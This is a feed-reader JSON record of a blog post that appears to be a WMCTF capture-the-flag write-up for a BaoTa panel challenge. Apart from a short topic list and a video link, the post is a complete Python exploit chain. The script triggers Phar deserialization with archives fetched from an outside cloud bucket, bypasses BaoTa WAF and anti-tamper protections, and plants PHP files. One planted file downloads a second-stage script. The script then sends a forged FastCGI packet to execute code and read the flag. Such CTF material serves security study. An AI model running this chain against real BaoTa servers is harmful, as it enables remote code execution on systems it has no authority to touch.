{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-07 05:06:36","updatedTime":"2020-09-07 05:06:36","title":"Nobody knows BaoTa better than me WriteUp","link":"https://www.zhaoj.in/?p=6660","description":"\n<p>复现地址：<a href=\"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/\">http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/</a></p>\n\n\n\n<p>题目附件下载：<a href=\"https://cos.wmctf.wetolink.com/nobody_knows_baota_better_than_me/bak.zip\">https://cos.wmctf.wetolink.com/nobody_knows_baota_better_than_me/bak.zip</a></p>\n\n\n\n<p>知识点：</p>\n\n\n\n<ul><li>PHP Phar 反序列化</li><li>宝塔 Apache WAF 绕过</li><li>宝塔防篡改模块绕过</li><li>OpenRASP 绕过</li><li>SSRF 攻击本地 unix domain socket 绕过 PHP disable_function</li></ul>\n\n\n\n<p>最近上班忙- -文字版 WriteUp  之后写。。。</p>\n\n\n\n<p>视频版解说：</p>\n\n\n\n<p><a href=\"https://www.bilibili.com/video/BV1jZ4y1K7Gi\">https://www.bilibili.com/video/BV1jZ4y1K7Gi</a></p>\n\n\n\n<p>Exp：</p>\n\n\n\n<pre class=\"wp-block-code\"><code>import socket\nimport requests\n\ns = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((\"111.73.46.229\", 80))\n\ns.send(b'GET /phpmyadmin_/../index.php?s=wechat/Review/img&#38;url=https://buu-1251267611.cos.ap-beijing-1.myqcloud.com/wmctfexp203989rdjoijejww/folder.phar HTTP/1.1\\r\\nHost: wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in\\r\\ncache-control: no-cache\\r\\n\\r\\n\\r\\n')\nresponse = s.recv(4096)\nprint(response)\n\nprint(\"&#91;+]目录 ./static/runtime 创建所需 phar 下载成功。\")\n\ns = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((\"111.73.46.229\", 80))\n\ns.send(b'GET /phpmyadmin_/../index.php?s=wechat/Review/img&#38;url=phar://./static/upload/tmp/bdc839bdd08a3cc4/07f1d630e3a4301e.jpg/test.txt HTTP/1.1\\r\\nHost: wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in\\r\\ncache-control: no-cache\\r\\n\\r\\n\\r\\n')\nresponse = s.recv(4096)\nprint(response)\n\nprint(\"&#91;+]目录 ./static/runtime 创建成功。\")\n\ns = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((\"111.73.46.229\", 80))\n\ns.send(b'GET /phpmyadmin_/../index.php?s=wechat/Review/img&#38;url=https://buu-1251267611.cos.ap-beijing-1.myqcloud.com/wmctfexp203989rdjoijejww/file.phar?a=12 HTTP/1.1\\r\\nHost: wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in\\r\\ncache-control: no-cache\\r\\n\\r\\n\\r\\n')\nresponse = s.recv(4096)\nprint(response)\n\nprint(\"&#91;+]文件创建所需 phar 下载成功。\")\n\ns = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((\"111.73.46.229\", 80))\n\ns.send(b'GET /phpmyadmin_/../index.php?s=wechat/Review/img&#38;url=phar://./static/upload/tmp/d062aa2572ad8816/591e8c689ee63736.jpg/test.txt HTTP/1.1\\r\\nHost: wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in\\r\\ncache-control: no-cache\\r\\n\\r\\n\\r\\n')\nresponse = s.recv(4096)\nprint(response)\n\nprint(\"&#91;+]文件创建所需 phar 执行成功。\")\n\nurl = \"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/static/runtime/468bc8d30505000a2d7d24702b2cda94.php\"\n\npayload = \"glzjin1=glzjinsend.php&#38;glzjin2=PD9waHAgJGZzID0gZnNvY2tvcGVuKCd1bml4Oi8vL3RtcC9waHAtY2dpLTcwLnNvY2snKTtmd3JpdGUoJGZzLCBiYXNlNjRfZGVjb2RlKCRfUE9TVFtnbHpqaW5kYXRhXSkpO3doaWxlICghZmVvZigkZnMpKSB7cHJpbnQgZnJlYWQoJGZzLDI1Nik7fQ\"\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'cache-control': \"no-cache\",\n    'Postman-Token': \"3e16adf8-2061-4826-a98a-09c421042e72\"\n    }\n\nresponse = requests.request(\"POST\", url, data=payload, headers=headers)\n\nprint(response.text)\n\nprint(\"&#91;+]写入 socket 代理成功。\")\n\nurl = \"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/static/runtime/468bc8d30505000a2d7d24702b2cda94.php\"\n\npayload = \"glzjin1=glzjindownload.php&#38;glzjin2=JTNDJTNGcGhwJTBBJTBBZmlsZV9wdXRfY29udGVudHMlMjglMjJnbHpqaW5wd24ucGhwJTIyJTJDZmlsZV9nZXRfY29udGVudHMlMjglMjJodHRwcyUzQSUyRiUyRmJ1dS0xMjUxMjY3NjExLmNvcy5hcC1iZWlqaW5nLTEubXlxY2xvdWQuY29tJTJGd21jdGZleHAyMDM5ODlyZGpvaWpland3JTJGZ2x6amlucHduLnBocCUyMiUyOSUyOSUzQg\"\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'cache-control': \"no-cache\",\n    'Postman-Token': \"a59157d0-3e61-400b-b7f0-efb6383fd798\"\n    }\n\nresponse = requests.request(\"POST\", url, data=payload, headers=headers)\n\nprint(response.text)\n\nprint(\"&#91;+]写入 PHP7.0 利用下载脚本成功。\")\n\nurl = \"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/static/runtime/glzjindownload.php\"\n\npayload = \"\"\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'cache-control': \"no-cache\",\n    'Postman-Token': \"778206ba-c135-47ff-bbc5-8bccb8e2751e\"\n    }\n\nresponse = requests.request(\"GET\", url, data=payload, headers=headers)\n\nprint(response.text)\n\nprint(\"&#91;+]写入 PHP7.0 利用脚本成功。\")\n\nurl = \"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/static/runtime/glzjinsend.php\"\n\npayload = \"glzjindata=AQEydwAIAAAAAQAAAAAAAAEEMncCOgAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPN1NDUklQVF9GSUxFTkFNRS93d3cvd3d3cm9vdC8xOTIuMTY4LjEyMy4yL3N0YXRpYy9ydW50aW1lL2dsemppbnB3bi5waHALN1NDUklQVF9OQU1FL3d3dy93d3dyb290LzE5Mi4xNjguMTIzLjIvc3RhdGljL3J1bnRpbWUvZ2x6amlucHduLnBocAwAUVVFUllfU1RSSU5HCzdSRVFVRVNUX1VSSS93d3cvd3d3cm9vdC8xOTIuMTY4LjEyMy4yL3N0YXRpYy9ydW50aW1lL2dsemppbnB3bi5waHANAURPQ1VNRU5UX1JPT1QvDw5TRVJWRVJfU09GVFdBUkVwaHAvZmNnaWNsaWVudAsJUkVNT1RFX0FERFIxMjcuMC4wLjELBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX0FERFIxMjcuMC4wLjELAlNFUlZFUl9QT1JUODALCVNFUlZFUl9OQU1FbG9jYWxob3N0DwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dA4BQ09OVEVOVF9MRU5HVEg4CR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DxZQSFBfQURNSU5fVkFMVUVhbGxvd191cmxfaW5jbHVkZSA9IE9uAQQydwAAAAABBTJ3AAgAADw%2FcGhwID8%2BAQUydwAAAAA%3D&#38;undefined=\"\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'cache-control': \"no-cache\",\n    'Postman-Token': \"5e893bb8-4c66-47bc-bbb7-92b8cd0eb6e7\"\n    }\n\nresponse = requests.request(\"POST\", url, data=payload, headers=headers)\n\nprint(response.text)\n\nprint(\"&#91;+]调用 PHP7.0 Socket 去执行 PHP7.0 利用脚本成功。\")\n\nimport requests\n\nurl = \"http://wjrfh39r3j4rio3f.baota.wmctf.zhaoj.in/static/runtime/glzjinflag.txt\"\n\npayload = \"\"\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'cache-control': \"no-cache\",\n    'Postman-Token': \"f9b09a86-1dac-49a7-9c78-b7e9fa215b36\"\n    }\n\nresponse = requests.request(\"GET\", url, data=payload, headers=headers)\n\nprint(response.text)\n\nprint(\"&#91;+]获取 flag 成功！\")</code></pre>\n","descriptionType":"html","publishedDate":"Fri, 07 Aug 2020 12:47:41 +0000","feedId":32607,"bgimg":"","linkMd5":"85d08a73a9e80c13237a236206b9afc5","bgimgJsdelivr":"","metaImg":"","author":"glzjin","publishedOrCreatedDate":1599426396526}],"record":{"createdTime":"2020-09-07 05:06:36","updatedTime":"2020-09-07 05:06:36","feedId":32607,"fetchDate":"Sun, 06 Sep 2020 21:06:36 +0000","fetchMs":122947,"handleMs":2960,"totalMs":126775,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"dedd5ccb1467a2e80e3f6fe114b81f8e","hostName":"europe-60*","requestId":"ce764c1950d54c5096bbf522a952922a_32607","contentType":"application/rss+xml; charset=UTF-8","totalBytes":0,"bgimgsTotal":0,"bgimgsGithubTotal":0,"articlesImgsTotal":0,"articlesImgsGithubTotal":0,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:56:06","updatedTime":"2020-09-07 02:56:06","id":32607,"name":"赵","url":"https://www.zhaoj.in/feed","subscriber":98,"website":null,"icon":"https://www.zhaoj.in/wp-content/uploads/2015/09/63a31fbec65e6094-32x32.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn28@2020_1/2020/09/06/21-06-35-407_9063ea448df71f2f.png","description":"西兴街道物理安全研究员 / 原学生@北京联合大学/信息安全爱好者 / 全栈开发 / 为心中的美好而战","weekly":null,"link":"https://www.zhaoj.in"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1599426269753,"total":0,"statList":[{"spend":123813,"msg":"获取xml内容"},{"spend":2960,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"正文链接上传到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"}]},"extra5":0,"extra6":0,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{},"extra12ImgCdnSuccessResultVector":[],"successGithubMap":{},"failGithubMap":{}}